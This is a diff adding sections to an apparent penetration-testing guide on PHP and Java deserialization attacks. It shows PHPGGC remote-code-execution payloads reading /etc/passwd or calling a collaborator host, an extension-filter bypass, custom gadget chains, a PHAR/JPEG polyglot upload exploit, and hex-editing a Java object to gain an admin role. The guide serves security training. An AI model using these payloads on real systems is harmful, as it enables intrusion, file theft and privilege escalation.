@@ -130,6 +130,118 @@ $phar->stopBuffering();
 ?>
 ```
 
+### PHPGGC-Based Exploitation (Practitioner Critical)
+
+When you know the target framework, use [PHPGGC](https://github.com/ambionics/phpggc) for framework-specific gadget chains:
+
+```bash
+# List available gadget chains
+phpggc -l
+
+# Generate payloads for common frameworks:
+# Laravel
+phpggc Laravel/RCE1 system 'id' -b  # Base64 encoded
+phpggc Laravel/RCE5 system 'cat /etc/passwd' -s  # Serialized
+
+# Symfony
+phpggc Symfony/RCE4 exec 'nslookup COLLAB.oastify.com'
+
+# WordPress/Guzzle
+phpggc Guzzle/RCE1 system 'id'
+
+# Monolog
+phpggc Monolog/RCE1 system 'id'
+
+# Generate as PHAR for file upload chains
+phpggc Laravel/RCE1 system 'id' -p phar -o exploit.phar
+# Rename to bypass extension filters:
+mv exploit.phar exploit.jpg
+```
+
+### Custom Gadget Chain Identification (Practitioner Critical)
+
+When standard chains fail, build custom chains by:
+
+```php
+<?php
+// Step 1: Identify available classes (read source or error messages)
+// Look for classes with dangerous magic methods:
+// __destruct() — called when object is garbage collected
+// __wakeup()   — called during unserialize()
+// __toString() — called when object is used as string
+// __call()     — called when non-existent method is invoked
+
+// Step 2: Trace the chain from magic method → dangerous sink
+// Example: __destruct() → deleteFile($this->path) → user controls $this->path
+
+// Step 3: Build the payload
+class CustomClass {
+    public $path = "/home/carlos/morale.txt";  // Target file
+}
+$obj = new CustomClass();
+echo serialize($obj);
+// O:11:"CustomClass":1:{s:4:"path";s:28:"/home/carlos/morale.txt";}
+
+// Step 4: For access token theft — chain to file_get_contents or similar
+class FileReader {
+    public $filename = "/etc/passwd";
+}
+class Logger {
+    public $logFile;
+    public function __construct() {
+        $this->logFile = new FileReader();
+    }
+}
+echo base64_encode(serialize(new Logger()));
+?>
+```
+
+### PHAR Polyglot via Image Upload
+
+When only image files can be uploaded, create a valid JPEG that's also a PHAR:
+
+```php
+<?php
+// Create polyglot PHAR+JPEG
+$jpeg = file_get_contents('legit.jpg');  // Start with real JPEG
+$phar = new Phar('polyglot.phar');
+$phar->startBuffering();
+$phar->addFromString('test.txt', 'test');
+
+// Set malicious metadata (this gets deserialized)
+$object = new VulnClass();
+$object->command = 'cat /etc/passwd';
+$phar->setMetadata($object);
+
+// Use JPEG as stub — file starts with JPEG magic bytes
+$phar->setStub($jpeg . '<?php __HALT_COMPILER(); ?>');
+$phar->stopBuffering();
+
+// Upload polyglot.phar as profile.jpg → server accepts (valid JPEG header)
+// Trigger: phar://uploads/profile.jpg/test.txt (via LFI or any file operation)
+// The setMetadata object gets deserialized → RCE
+?>
+```
+
+### Java Serialized Object Modification
+
+When you can intercept a serialized Java object (cookie, hidden field, API):
+
+```bash
+# Step 1: Decode the base64 serialized object
+echo "BASE64_OBJECT" | base64 -d | xxd > object.hex
+
+# Step 2: Identify the magic bytes (AC ED 00 05 = Java serialization)
+# Find string values in hex dump and modify them
+
+# Step 3: Change access level or role
+# Find "user" in hex, replace with "admin" (pad with length adjustments)
+# s:0004:user → s:0005:admin (update length prefix)
+
+# Step 4: Re-encode and submit
+cat modified.hex | xxd -r | base64 -w0
+```
+
 ## Python Pickle Deserialization
 
 ### Detection
